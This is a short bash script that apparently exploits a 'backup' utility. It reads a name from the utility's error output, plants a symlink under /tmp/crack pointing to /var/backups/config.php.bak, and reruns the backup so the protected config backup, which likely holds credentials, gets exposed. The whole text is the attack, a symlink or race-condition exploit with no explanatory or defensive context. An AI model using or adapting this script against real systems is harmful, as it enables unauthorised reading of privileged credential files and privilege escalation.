#!/bin/bash
i=$(backup | grep ERROR |  awk '{print $2}');
ln -s /var/backups/config.php.bak /tmp/crack/$i;
backup;
